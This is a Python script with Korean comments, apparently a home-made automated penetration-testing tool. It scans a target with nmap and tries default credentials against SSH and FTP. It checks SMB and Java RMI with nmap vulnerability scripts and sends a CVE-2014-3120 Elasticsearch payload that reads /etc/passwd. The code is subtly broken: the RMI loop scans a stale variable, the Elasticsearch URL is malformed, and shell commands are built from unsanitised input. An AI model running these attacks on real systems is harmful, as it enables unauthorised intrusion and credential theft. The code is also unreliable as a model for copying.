import os
import re
import subprocess
import paramiko     # python에서 사용하는 ssh 패키지
import ftplib       # python에서 사용하는 ftp 패키지
import argparse      # cmd 매개 변수 사용을 위함
import locale       # subprocess 한글 출력을 위한 모듈
import requests     # elastic 취약점 확인 등을 위한 모듈

os_encoding = locale.getpreferredencoding() # subprocess 한글 출력을 위한 모듈!

print('################ Auto_Pentest Start ##############\n')

##################### 인자값을 받을 수 있는 인스턴스 생성 #######################
parser = argparse.ArgumentParser(description='일일히 체크하기 귀찮아서 만든 스크립트.')

# 입력받을 인자값 등록
parser.add_argument('--ip', required=True, help='ip 입력')  # required은 필수로 넣어야하는 파라미터로 설정하는 옵션

# 입력받은 인자값을 args에 저장 (type: namespace) 
args = parser.parse_args()



##################### nmap 스캔 후 txt 저장 #######################
ip_scan = subprocess.check_output('nmap -sS '+args.ip)
ip_scan_result = ip_scan.decode(os_encoding).strip()        # subprocess 한글 출력을 위한 모듈!

with open('nmap.txt', 'w') as f:
    f.write('##### ip result #####\n')
    f.write(ip_scan_result)



################### nmap 파일 오픈 ###################
nmap_open = open('nmap.txt',"r")

ssh_ip_list=[]  # ssh가 열려있는 ip 리스트 
ftp_ip_list=[]  # ftp가 열려있는 ip 리스트 
smb_ip_list=[]  # smb가 열려있는 ip 리스트
elastic_ip_list=[]  # elastic search가 열려있는 ip 리스트 9200
rmi_ip_1098_list=[]  # rmi가 열려있는 ip 리스트 1098
rmi_ip_1099_list=[]  # rmi가 열려있는 ip 리스트 1099

ssh_result = [] # ssh 디폴트 계정 접근 결과
ftp_result = [] # ftp 디폴트 계정 접근 결과
smb_result = [] # smb 취약점 존재 유무 결과
elastic_result=[]  # elastic search 취약점 유무(CVE-2014-3120)
rmi_result = [] # rmi 취약점 존재 유무 결과


gubun = ["ssh","ftp","microsoft-ds","9200",["1098","1099"]]
human_gubun = ["SSH","FTP","SMB","Elastic Search","RMI"]

id_list = ['anonymous','root','admin']
pw_list = ['root','admin']




################### 각 포트가 존재하는 ip 리스트 생성 ###################
for line in nmap_open:
    ip_find = re.search('(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}',line)
    
    if(ip_find):
        now_ip = ip_find.group()    # ip만 뽑아서 저장
    
    #### ssh
    if(line.find(gubun[0])>0):     # ssh 문구가 존재한다 = ssh가 열려있다
        if(line.find("closed")<=0 and line.find("filtered")<=0):    # open 되어 있는 ip만 필터링
            ssh_ip_list.append(now_ip)

    #### ftp
    if(line.find(gubun[1])>0):
        if(line.find("closed")<=0 and line.find("filtered")<=0):
            ftp_ip_list.append(now_ip)

    #### smb
    if(line.find(gubun[2])>0):
        if(line.find("closed")<=0 and line.find("filtered")<=0):
            smb_ip_list.append(now_ip)

    #### elastic
    if(line.find(gubun[3])>=0):     # 맨 앞에꺼는 0으로 찍히기 떄문에 = 붙여야함, 없으면 -1임
        if(line.find("closed")<=0 and line.find("filtered")<=0):
            elastic_ip_list.append(now_ip)

    #### rmi_1098
    if(line.find(gubun[4][0])>=0):
        if(line.find("closed")<=0 and line.find("filtered")<=0):
            rmi_ip_1098_list.append(now_ip)

    #### rmi_1098
    if(line.find(gubun[4][1])>=0):
        if(line.find("closed")<=0 and line.find("filtered")<=0):
            rmi_ip_1099_list.append(now_ip)



################### ssh 디폴트 로그인 확인 ###################
if(ssh_ip_list):
    for ssh_ip in ssh_ip_list:
        for ssh_id in id_list:
            for ssh_pw in pw_list:
                try:
                    if(ssh_id != 'anonymous'):
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(ssh_ip, port='22', username=ssh_id, password=ssh_pw)
                        ssh_each=ssh_ip+" "+ssh_id+"/"+ssh_pw+" "+"TRUE"
                        ssh_result.append(str(ssh_each))
                except:
                    ssh_each=str(ssh_ip)+" "+ssh_id+"/"+ssh_pw+" "+"FALSE"
                    ssh_result.append(str(ssh_each))
            
else:
    ssh_result.append("열려있는 ssh 포트 없음")     



################### ftp 디폴트 로그인 확인 ###################
if(ftp_ip_list):
    for ftp_ip in ftp_ip_list:
        for ftp_id in id_list:
            for ftp_pw in pw_list:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(host=ftp_ip, timeout=100)
                    ftp.login(user=ftp_id, passwd=ftp_pw)
                    if(ftp_id=="anonymous"):
                        ftp_each=ftp_ip+" "+ftp_id+" "+"TRUE"
                        ftp_result.append(str(ftp_each))
                        break
                    else:
                        ftp_each=ftp_ip+" "+ftp_id+"/"+ftp_pw+" "+"TRUE"
                        ftp_result.append(str(ftp_each))
                except:
                    if(ftp_id=="anonymous"):
                        ftp_each=ftp_ip+" "+ftp_id+" "+"FALSE"
                        ftp_result.append(str(ftp_each))
                        break
                    else:
                        ftp_each=ftp_ip+" "+ftp_id+"/"+ftp_pw+" "+"FALSE"
                        ftp_result.append(str(ftp_each)) 
else:
    ftp_result.append("열려있는 ftp 포트 없음")              



################### smb 취약점 존재 확인 ###################
if(smb_ip_list):
    for smb_ip in smb_ip_list:
        command = "nmap --script smb-vuln* -p 445 "+smb_ip
        process = os.popen(command)
        results = str(process.read())

        if(len(results)>500):
            if(results.find("VULNERABLE")>0):
                smb_result.append(smb_ip+" : "+str(len(results))+" - VULNERABLE!!")
            else:
                smb_result.append(smb_ip+" : "+str(len(results))+" - 확인필요")
        else:
            smb_result.append("SMB 포트 열려있음 - metasploit 시도 필요")
else:
    smb_result.append("열려있는 smb 포트 없음")



################### elastic 취약점 존재 확인 ###################
if(elastic_ip_list):
    for elastic_ip in elastic_ip_list:
        elastic_con = elastic_ip+":9200"
        try:
            elastic_poc=requests.get(elastic_con+"_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22%2Fetc%2Fhosts%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fhosts%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%2C%22%2Fetc%2Fpasswd%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fpasswd%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%7D%7D&callback=jQuery111107529820275958627_1400564696673&_=1400564696674")
            elastic_result.append(elastic_ip+" : "+elastic_poc.text)
        except:
            elastic_result.append(elastic_ip+" : "+"elastic 열려있음")
else:
    elastic_result.append("열려있는 elastic 포트 없음")



################### rmi 취약점 존재 확인 ###################
if(rmi_ip_1098_list or rmi_ip_1099_list):
    for rmi_ip in rmi_ip_1098_list:
        command = "nmap --script=rmi-vuln-classloader -p 1098 "+line
        process = os.popen(command)
        results = str(process.read())

        if(results.find("VULNERABLE")>0):
            rmi_result.append(line+" : 1098 - VULNERABLE!!")
        else:
            rmi_result.append(line+" : 1098 - metasploit 시도 필요")

    for line in rmi_ip_1099_list:
        command = "nmap --script=rmi-vuln-classloader -p 1099 "+line
        process = os.popen(command)
        results = str(process.read())

        if(results.find("VULNERABLE")>0):
            rmi_result.append(line+" : 1099 - VULNERABLE!!")
        else:
            rmi_result.append(line+" : 1099 - metasploit 시도 필요")
else:
    rmi_result.append("열려있는 rmi 포트 없음")



################### 결과 파일 만들기 ###################
with open('pentest_result.txt', 'w') as f:
    for all_result in human_gubun:
        f.write('\n\n##### '+all_result+' result #####\n')

        if(all_result=="SSH"):
            for ssh in ssh_result:
                f.write(ssh+"\n")

        elif(all_result=="FTP"):
            for ftp in ftp_result:
                f.write(ftp+"\n")

        elif(all_result=="SMB"):
            for smb in smb_result:
                f.write(smb+"\n")

        elif(all_result=="Elastic Search"):
            for elastic in elastic_result:
                f.write(elastic+"\n")

        elif(all_result=="RMI"):
            for rmi in rmi_result:
                f.write(rmi+"\n")
       



#### ssh 닫기 ####
try:
    ssh.close()
except:
    print("디폴트 ssh가 없습니다\n")



#### ftp 닫기 ####
try:
    ftp.close()
except:
    print('디폴트 ftp가 없습니다\n')



#### nmap 파일 닫기 ####
nmap_open.close()
print("################ END #################")
